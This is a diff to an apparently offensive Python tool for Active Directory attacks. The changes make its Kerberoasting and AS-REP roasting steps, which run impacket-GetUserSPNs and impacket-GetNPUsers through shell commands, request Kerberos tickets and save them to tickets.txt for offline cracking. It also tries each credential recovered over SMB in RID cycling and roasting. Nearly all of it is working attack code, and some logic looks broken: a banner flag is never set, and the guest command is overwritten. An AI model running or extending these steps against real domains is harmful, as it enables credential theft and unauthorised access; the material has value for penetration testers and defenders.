@@ -72,10 +72,10 @@ def print_cracking_cmd():
 
 
 def check_kerberoast(target, domain, user='Guest', passw=''):
-    cmd = f'impacket-GetUserSPNs {domain}/{user}:{passw} -dc-ip {target} -stealth'
+    cmd = f'impacket-GetUserSPNs {domain}/{user}:{passw} -dc-ip {target} -stealth -request -output tickets.txt'
 
     if (user == 'Guest'):
-        cmd = f'impacket-GetUserSPNs {domain}/jhon.doe -no-pass -dc-ip {target} -stealth'
+        cmd = f'impacket-GetUserSPNs {domain}/jhon.doe -no-pass -dc-ip {target} -stealth -request -output tickets.txt'
 
     try:
         output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
@@ -148,16 +148,14 @@ def check_smb_credentials(target, domain):
         for item in credentials:
             if ('Guest' not in item) and (':' in item):
                 cred = item
-                break
-        if not cred: return
-        user, passwd = cred.split(':')[:2]
-        #print('check kerberoast with creds')
-        check_kerberoast(target, domain, user, passwd)
-        #print('try to regenerate smb_users.txt file using creds before asreproast')
-        rid_cycling(target=target, domain=domain)
-        #print('check asreproast with creds')
-        check_asreproast(target, domain, user, passwd)
-        return True
+                user, passwd = cred.split(':')[:2]
+                #print('check kerberoast with creds')
+                check_kerberoast(target, domain, user, passwd)
+                #print('try to regenerate smb_users.txt file using creds before asreproast')
+                rid_cycling(target=target, domain=domain, user=user, passw=passwd)
+                #print('check asreproast with creds')
+                check_asreproast(target, domain, user, passwd)
+                return True
     return False
 
 
@@ -166,9 +164,9 @@ def check_asreproast(target, domain, user='Guest', passw=''):
     filename = 'smb_users.txt'
     if not (os.path.exists(filename)): return
     if (user == 'Guest'):        
-        cmd = f'impacket-GetNPUsers -no-pass {domain}/guest -dc-ip {target} -usersfile {filename}'
+        cmd = f'impacket-GetNPUsers -no-pass {domain}/guest -dc-ip {target} -usersfile {filename} -output tickets.txt'
     # Creds
-    cmd = f'impacket-GetNPUsers {domain}/{user}:{passw} -dc-ip {target} -usersfile {filename}'
+    cmd = f'impacket-GetNPUsers {domain}/{user}:{passw} -dc-ip {target} -usersfile {filename} -output tickets.txt'
     
     try:
         output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
@@ -177,12 +175,16 @@ def check_asreproast(target, domain, user='Guest', passw=''):
 
     if output:
         if (domain.upper() in output):
-            printc('[+] ASREPRoastable accounts founded.', GREEN)
+            banner_printed = False
             for line in output.splitlines():
                 if (domain.upper() in line) and (target not in line):
+                    if not banner_printed:
+                        print_banner('88')
+                        print('[!] KERBEROS')
+                        print(f'[!] {cmd}')
+                        printc('[+] ASREPRoastable accounts founded.', GREEN)
                     printc(f'[+] {line}', BLUE)
-
-            log(output, cmd, target, 'impacket-GetNPUsers')
+                    log(output, cmd, target, 'impacket-GetNPUsers')
 
 
 def bruteforce_kerberos_users(target, domain):
